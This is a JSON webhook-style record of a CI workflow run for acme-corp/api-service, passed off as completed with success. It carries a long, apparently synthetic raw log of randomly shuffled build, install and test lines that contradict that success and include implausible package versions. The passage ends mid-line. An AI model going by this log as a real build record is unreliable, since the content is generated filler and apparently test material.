{
  "action": "completed",
  "workflow_run": {
    "id": 413,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "da23caf6b7e96c39ad689fea53938a13200e4d0a",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-01T12:00:25.774541Z",
    "updated_at": "2025-12-01T12:02:59.044390Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:25] INFO: Processing request\nStep 1/10: Building\nCache hit for key-1046\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:25] INFO: Processing request\nStep 5/10: Building\n  PASS: test_user_create (133ms)\nCache hit for key-8873\n[12:00:25] INFO: Processing request\nCache hit for key-7159\nCache hit for key-6067\nCompiling src/utils.go...\n  PASS: test_db_connect (243ms)\nCache hit for key-1651\n[12:00:25] INFO: Processing request\nStep 5/10: Building\nStep 9/10: Building\n  PASS: test_user_create (197ms)\nCache hit for key-8236\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (42MB)\nInstalling prettier@5.17.0\nCache hit for key-6583\nInstalling express@4.2.0\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_db_connect (83ms)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nStep 2/10: Building\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCache hit for key-5199\nStep 10/10: Building\nWARNING: react has known vulnerabilities\nStep 3/10: Building\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nInstalling react@4.12.0\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (29MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nInstalling react@4.6.0\nCompiling src/service.java...\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (10MB)\nInstalling webpack@1.9.0\nInstalling axios@4.15.0\n\u2713 lint completed\nCompiling src/handler.rs...\nInstalling webpack@1.20.0\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-3324\nInstalling prettier@4.2.0\nException: RuntimeError\n  PASS: test_cache_hit (36ms)\n  PASS: test_db_connect (222ms)\nCache hit for key-2089\nStep 3/10: Building\nCache hit for key-4305\n\u2713 test completed\nInstalling eslint@5.12.0\nCache hit for key-6681\n\u2713 lint completed\nCache hit for key-5603\nStep 9/10: Building\n  PASS: test_api_health (37ms)\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/app.ts...\nFAILED: test_cache_hit\nInstalling axios@4.20.0\nInstalling express@2.10.0\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (19MB)\nInstalling eslint@2.17.0\nCompiling src/handler.rs...\nCache hit for key-5526\nStep 8/10: Building\n\u2713 build completed\n  PASS: test_user_create (340ms)\n[12:00:25] INFO: Processing request\nInstalling webpack@3.10.0\nStep 4/10: Building\nInstalling prettier@4.1.0\nStep 7/10: Building\n  PASS: test_auth_login (131ms)\nStep 4/10: Building\n\u2713 test completed\n  PASS: test_api_health (19ms)\nArtifact uploaded: build.tar.gz (48MB)\nStep 1/10: Building\n  PASS: test_db_connect (137ms)\n  PASS: test_api_health (318ms)\n\u2713 build completed\nInstalling prettier@5.13.0\n  PASS: test_db_connect (256ms)\nStep 4/10: Building\n  PASS: test_api_health (124ms)\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_cache_hit (360ms)\nInstalling axios@1.17.0\nCache hit for key-1300\nStep 2/10: Building\nInstalling express@5.13.0\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (466ms)\n\u2713 lint completed\nCache hit for key-6225\n\u2713 build completed\n[12:00:25] INFO: Processing request\n\u2713 build completed\nInstalling prettier@2.1.0\nStep 10/10: Building\nStep 8/10: Building\nCache hit for key-7852\nCache hit for key-7343\n[12:00:25] WARN: Deprecated API usage\n\u2713 test completed\nInstalling prettier@3.18.0\n[12:00:25] INFO: Processing request\nCache hit for key-8835\n[12:00:25] INFO: Processing request\nStep 6/10: Building\nInstalling lodash@4.8.0\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (31MB)\n\u2713 build completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nStep 9/10: Building\n[12:00:25] INFO: Processing request\nInstalling axios@1.6.0\nCompiling src/handler.rs...\n[12:00:25] WARN: Deprecated API usage\nInstalling axios@5.4.0\nInstalling eslint@5.16.0\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nFAILED: test_cache_hit\nCache hit for key-9239\nInstalling express@4.7.0\n[12:00:25] INFO: Processing request\nInstalling eslint@5.11.0\nInstalling prettier@3.1.0\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/service.java...\n\u2713 test completed\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-6132\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (486ms)\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:25] INFO: Processing request\nStep 7/10: Building\nInstalling lodash@2.10.0\nCache hit for key-3758\n  PASS: test_auth_login (483ms)\nWARNING: react has known vulnerabilities\nCache hit for key-8911\nInstalling axios@5.14.0\n  PASS: test_db_connect (78ms)\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:25] INFO: Processing request\n\u2713 build completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nStep 9/10: Building\n  PASS: test_cache_hit (22ms)\nInstalling jest@2.13.0\n  PASS: test_user_create (402ms)\n\u2713 test completed\nCache hit for key-1968\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (309ms)\n\u2713 test completed\nInstalling lodash@4.8.0\nFAILED: test_cache_hit\n=== Step deploy_staging completed ===\n=== Step: save_cache ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:25] INFO: Processing request\nCache hit for key-3836\nStep 7/10: Building\nCache hit for key-2825\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_db_connect (84ms)\n  PASS: test_auth_login (344ms)\n  PASS: test_db_connect (414ms)\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\nCompiling src/utils.go...\nStep 10/10: Building\n[12:00:25] INFO: Processing request\nCache hit for key-9288\n  PASS: test_auth_login (496ms)\nCompiling src/app.ts...\nInstalling eslint@3.17.0\nInstalling jest@3.2.0\n\u2713 build completed\n\u2713 test completed\n\u2717 build failed with exit code 12\nInstalling lodash@2.10.0\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/index.js...\nCache hit for key-3459\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-8333\n\u2713 build completed\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_api_health (363ms)\nCache hit for key-7334\nInstalling jest@1.9.0\n\u2713 test completed\nCache hit for key-6565\n  PASS: test_cache_hit (220ms)\n  PASS: test_auth_login (173ms)\n  PASS: test_cache_hit (463ms)\n\u2713 test completed\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (299ms)\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (9MB)\nStep 3/10: Building\nInstalling webpack@5.4.0\nStep 4/10: Building\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\nCache hit for key-3133\nStep 4/10: Building\nCache hit for key-4580\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/index.js...\nStep 10/10: Building\n[12:00:25] INFO: Processing request\nStep 1/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCache hit for key-9680\nCache hit for key-8603\nInstalling axios@1.3.0\nCache hit for key-9434\n[12:00:25] INFO: Processing request\nCache hit for key-7432\n[12:00:25] INFO: Processing request\nInstalling prettier@5.7.0\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nInstalling eslint@2.16.0\nArtifact uploaded: build.tar.gz (28MB)\nWARNING: axios has known vulnerabilities\nInstalling react@3.12.0\n\u2713 lint completed\nInstalling eslint@4.3.0\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_api_health (94ms)\nInstalling webpack@3.20.0\nCompiling src/app.ts...\nInstalling lodash@3.16.0\nStep 2/10: Building\nStep 8/10: Building\n\u2713 lint completed\nCache hit for key-7728\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (182ms)\n\u2717 build failed with exit code 21\nInstalling prettier@3.15.0\n  PASS: test_db_connect (122ms)\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nInstalling react@5.8.0\n\u2713 build completed\nStep 5/10: Building\n  PASS: test_db_connect (16ms)\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:25] INFO: Processing request\nStep 9/10: Building\nInstalling prettier@5.18.0\n[12:00:25] INFO: Processing request\nStep 1/10: Building\n[12:00:25] INFO: Processing request\nWARNING: jest has known vulnerabilities\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_auth_login (457ms)\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\nCache hit for key-4057\nStep 3/10: Building\nCompiling src/utils.go...\nCache hit for key-5745\n\u2717 build failed with exit code 20\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_api_health (413ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-2596\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 test completed\nStep 7/10: Building\n\u2713 lint completed\nStep 3/10: Building\n\u2713 build completed\n  PASS: test_db_connect (458ms)\n  PASS: test_db_connect (245ms)\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\n\u2713 build completed\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nInstalling lodash@4.12.0\nArtifact uploaded: build.tar.gz (50MB)\nStep 7/10: Building\n\u2713 test completed\n\u2713 test completed\nFAILED: test_auth_login\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/index.js...\nStep 7/10: Building\nCache hit for key-9862\nWARNING: axios has known vulnerabilities\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\n\u2713 lint completed\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nStep 6/10: Building\n\u2713 build completed\nCache hit for key-9903\n  PASS: test_user_create (449ms)\nInstalling lodash@5.6.0\nInstalling axios@5.9.0\nArtifact uploaded: build.tar.gz (5MB)\nInstalling express@1.8.0\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/utils.go...\nCache hit for key-4162\nStep 2/10: Building\nCache hit for key-7825\nInstalling react@5.13.0\nCache hit for key-2697\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-8558\nInstalling react@5.5.0\n[12:00:25] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\nInstalling lodash@4.20.0\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-7975\nCache hit for key-6199\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\n\u2713 test completed\nFAILED: test_db_connect\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:25] INFO: Processing request\nInstalling lodash@1.11.0\nCache hit for key-1304\nCache hit for key-1730\nStep 2/10: Building\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (20MB)\nInstalling prettier@1.5.0\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_cache_hit (414ms)\nStep 7/10: Building\n[12:00:25] INFO: Processing request\n=== Step save_cache completed ===\n=== Step: upload_artifacts ===\nCache hit for key-7884\nInstalling axios@3.2.0\nArtifact uploaded: build.tar.gz (36MB)\nInstalling react@4.12.0\n\u2717 build failed with exit code 71\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_auth_login (110ms)\nCompiling src/handler.rs...\n\u2713 build completed\nCache hit for key-8265\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_api_health (215ms)\nInstalling webpack@4.12.0\nFAILED: test_user_create\n\u2713 build completed\n[12:00:25] INFO: Processing request\nInstalling jest@4.0.0\nStep 1/10: Building\nCache hit for key-4853\n\u2713 lint completed\nCache hit for key-8865\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:25] INFO: Processing request\nCache hit for key-6215\nInstalling webpack@1.13.0\n\u2713 build completed\n[12:00:25] ERROR: Connection failed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (210ms)\nInstalling webpack@5.6.0\n  PASS: test_cache_hit (267ms)\nCompiling src/main.py...\nCompiling src/handler.rs...\nCache hit for key-4624\nFAILED: test_user_create\nInstalling jest@1.17.0\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (48MB)\nStep 3/10: Building\n\u2713 lint completed\n  PASS: test_auth_login (365ms)\n  PASS: test_cache_hit (275ms)\n  PASS: test_db_connect (305ms)\n\u2713 test completed\nStep 9/10: Building\n  PASS: test_db_connect (76ms)\nStep 5/10: Building\n[12:00:25] INFO: Processing request\nStep 3/10: Building\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCache hit for key-9740\nStep 5/10: Building\nCompiling src/index.js...\nStep 7/10: Building\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_cache_hit (123ms)\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/service.java...\n  PASS: test_cache_hit (402ms)\nCache hit for key-2474\nArtifact uploaded: build.tar.gz (28MB)\nStep 9/10: Building\nStep 4/10: Building\nInstalling react@5.12.0\nCompiling src/index.js...\n\u2717 build failed with exit code 111\nInstalling axios@3.1.0\nInstalling axios@2.20.0\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_db_connect (318ms)\n  PASS: test_auth_login (447ms)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\n\u2713 lint completed\nStep 10/10: Building\n\u2713 lint completed\n  PASS: test_db_connect (59ms)\nInstalling prettier@1.13.0\nCompiling src/handler.rs...\nCache hit for key-3603\n\u2713 lint completed\n[12:00:25] ERROR: Connection failed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nException: ValueError\n  PASS: test_cache_hit (443ms)\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-2328\n  PASS: test_db_connect (248ms)\n[12:00:25] INFO: Processing request\n[12:00:25] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (483ms)\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (417ms)\n  PASS: test_db_connect (365ms)\n  PASS: test_user_create (401ms)\n  PASS: test_user_create (118ms)\n  PASS: test_api_health (70ms)\nCache hit for key-9576\n[12:00:25] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_user_create (192ms)\n\u2713 lint completed\n  PASS: test_cache_hit (113ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (490ms)\nStep 1/10: Building\nInstalling eslint@4.14.0\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (258ms)\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:25] INFO: Processing request\nCache hit for key-9208\nCompiling src/main.py...\nCompiling src/handler.rs...\nCache hit for key-1910\nWARNING: lodash has known vulnerabilities\nFAILED: test_cache_hit\nStep 8/10: Building\n[12:00:25] INFO: Processing request\n\u2713 build completed\nStep 5/10: Building\n  PASS: test_db_connect (397ms)\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-8806\nInstalling express@4.0.0\n  PASS: test_db_connect (34ms)\nArtifact uploaded: build.tar.gz (42MB)\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (46MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/service.java...\n\u2713 build completed\nInstalling react@1.9.0\n  PASS: test_cache_hit (381ms)\nInstalling react@2.9.0\nCompiling src/service.java...\nCache hit for key-4110\nCache hit for key-9957\nStep 5/10: Building\nStep 8/10: Building\nInstalling prettier@1.17.0\nWARNING: webpack has known vulnerabilities\nCompiling src/main.py...\n\u2713 build completed\nCompiling src/main.py...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-7794\n  PASS: test_user_create (184ms)\n  PASS: test_auth_login (329ms)\nCompiling src/app.ts...\nCache hit for key-1686\nInstalling axios@4.13.0\n[12:00:25] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_cache_hit (382ms)\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_user_create (195ms)\n\u2713 lint completed\nCompiling src/service.java...\n\u2713 test completed\n[12:00:25] INFO: Processing request\nInstalling jest@3.9.0\n\u2713 test completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (48MB)\nInstalling prettier@2.8.0\nInstalling express@3.9.0\nCompiling src/utils.go...\n\u2713 build completed\nStep 9/10: Building\nInstalling axios@4.2.0\nCompiling src/app.ts...\n  PASS: test_db_connect (349ms)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:25] INFO: Processing request\n\u2713 test completed\n  PASS: test_user_create (323ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:25] ERROR: Connection failed\nCache hit for key-3967\n=== Step upload_artifacts completed ===\n=== Step: e2e_tests ===\nCompiling src/app.ts...\nCache hit for key-4547\nCompiling src/index.js...\n  PASS: test_user_create (78ms)\nInstalling react@4.2.0\n  PASS: test_auth_login (234ms)\nCompiling src/app.ts...\nCompiling src/app.ts...\nCache hit for key-7122\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 lint completed\nCache hit for key-6606\nStep 4/10: Building\nCompiling src/handler.rs...\n  PASS: test_auth_login (416ms)\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\nInstalling lodash@5.20.0\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (215ms)\nFAILED: test_auth_login\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nStep 2/10: Building\nStep 5/10: Building\nCompiling src/main.py...\nInstalling eslint@1.4.0\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (161ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (39MB)\nStep 6/10: Building\n  PASS: test_db_connect (277ms)\nCache hit for key-5092\nInstalling react@5.15.0\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n  PASS: test_auth_login (306ms)\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\nCache hit for key-7975\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_user_create (38ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nCache hit for key-9124\nCache hit for key-2537\n  PASS: test_db_connect (50ms)\nCache hit for key-4773\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCache hit for key-4508\nStep 3/10: Building\n[12:00:25] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling prettier@2.16.0\nCompiling src/handler.rs...\n  PASS: test_db_connect (341ms)\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_auth_login (159ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:25] INFO: Processing request\nInstalling axios@1.1.0\n  PASS: test_cache_hit (231ms)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 test completed\n\u2713 build completed\nCache hit for key-2350\nCache hit for key-1404\n  PASS: test_auth_login (192ms)\n  PASS: test_api_health (435ms)\nCompiling src/main.py...\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nInstalling prettier@2.9.0\nStep 1/10: Building\nInstalling axios@3.6.0\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@2.14.0\nInstalling webpack@3.3.0\n\u2713 test completed\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\nStep 9/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-4444\nInstalling prettier@5.3.0\nException: NullPointerException\nStep 7/10: Building\nStep 8/10: Building\n  PASS: test_auth_login (215ms)\nInstalling prettier@3.9.0\nInstalling axios@2.9.0\nCompiling src/main.py...\nInstalling lodash@2.7.0\n  PASS: test_user_create (213ms)\nInstalling axios@5.4.0\n  PASS: test_cache_hit (491ms)\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-2213\nCompiling src/index.js...\n[12:00:25] ERROR: Connection failed\nCache hit for key-2225\nInstalling jest@2.18.0\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_api_health (39ms)\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:25] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-3285\nCompiling src/index.js...\n[12:00:25] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/utils.go...\nCache hit for key-1805\n[12:00:25] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\n  PASS: test_auth_login (227ms)\n  PASS: test_db_connect (460ms)\nArtifact uploaded: build.tar.gz (10MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_db_connect (358ms)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nCompiling src/app.ts...\nInstalling jest@3.15.0\nCompiling src/index.js...\nCache hit for key-4759\nCache hit for key-9111\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (32ms)\nArtifact uploaded: build.tar.gz (50MB)\nStep 4/10: Building\n\u2713 test completed\nStep 4/10: Building\nStep 3/10: Building\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\n\u2717 build failed with exit code 54\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nInstalling express@5.1.0\n[12:00:25] INFO: Processing request\nInstalling lodash@5.5.0\nCache hit for key-5613\n\u2713 test completed\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:25] INFO: Processing request\nException: TypeError\n  PASS: test_auth_login (264ms)\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/handler.rs...\nCompiling src/main.py...\nInstalling axios@1.6.0\nInstalling prettier@2.17.0\n\u2713 test completed\n  PASS: test_user_create (322ms)\nStep 9/10: Building\n  PASS: test_auth_login (222ms)\nCompiling src/utils.go...\n  PASS: test_user_create (230ms)\nArtifact uploaded: build.tar.gz (36MB)\nInstalling lodash@3.14.0\nInstalling lodash@4.9.0\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nWARNING: axios has known vulnerabilities\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (155ms)\nCache hit for key-6225\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 test completed\n[12:00:25] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (36MB)\n=== Step e2e_tests completed ===\n=== Step: install_dependencies ===\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_db_connect (492ms)\nCache hit for key-5512\n[12:00:25] WARN: Deprecated API usage\nStep 4/10: Building\n[12:00:25] INFO: Processing request\nCache hit for key-7979\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (397ms)\n\u2713 lint completed\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\nInstalling express@5.0.0\n[12:00:25] INFO: Processing request\nCache hit for key-6688\n  PASS: test_auth_login (30ms)\n  PASS: test_user_create (208ms)\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 lint completed\n  PASS: test_db_connect (459ms)\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 3/10: Building\nStep 5/10: Building\n\u2713 lint completed\n\u2713 build completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/utils.go...\n\u2717 build failed with exit code 103\n\u2713 test completed\nStep 4/10: Building\nInstalling express@5.4.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\n  PASS: test_api_health (68ms)\n[12:00:25] INFO: Processing request\nCache hit for key-1249\nStep 1/10: Building\n  PASS: test_user_create (98ms)\n[12:00:25] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-2424\n  PASS: test_api_health (256ms)\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 lint completed\nInstalling prettier@3.0.0\nCompiling src/handler.rs...\n[12:00:25] WARN: Deprecated API usage\nCompiling src/main.py...\n  PASS: test_db_connect (241ms)\n\u2713 test completed\n\u2713 test completed\nInstalling react@2.15.0\nStep 5/10: Building\n\u2713 build completed\nInstalling lodash@2.3.0\nStep 9/10: Building\n[12:00:25] WARN: Deprecated API usage\nInstalling prettier@1.2.0\n\u2713 build completed\nInstalling express@2.20.0\nWARNING: react has known vulnerabilities\nInstalling webpack@2.12.0\nCompiling src/index.js...\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-2528\nCache hit for key-4186\n  PASS: test_api_health (364ms)\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nStep 1/10: Building\nCache hit for key-9426\nCache hit for key-8965\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (16MB)\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_user_create (71ms)\n  PASS: test_db_connect (148ms)\n  PASS: test_api_health (295ms)\nException: RuntimeError\nCompiling src/service.java...\nStep 1/10: Building\n\u2717 build failed with exit code 103\nCompiling src/index.js...\nCompiling src/service.java...\n  PASS: test_cache_hit (179ms)\n\u2713 test completed\nCache hit for key-8023\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nStep 6/10: Building\nCache hit for key-2383\n  PASS: test_auth_login (92ms)\n  PASS: test_user_create (457ms)\nStep 7/10: Building\n\u2713 lint completed\nInstalling webpack@2.18.0\nCompiling src/handler.rs...\nStep 3/10: Building\n\u2713 test completed\n  PASS: test_db_connect (403ms)\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@2.18.0\n\u2713 build completed\n  PASS: test_api_health (402ms)\nCompiling src/service.java...\n\u2713 lint completed\nCache hit for key-7707\n\u2713 build completed\nCache hit for key-6493\nInstalling prettier@1.15.0\n\u2713 test completed\n  PASS: test_user_create (351ms)\n\u2713 build completed\nStep 2/10: Building\nCache hit for key-3874\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-2660\nInstalling jest@4.0.0\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:25] INFO: Processing request\nCache hit for key-5226\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for 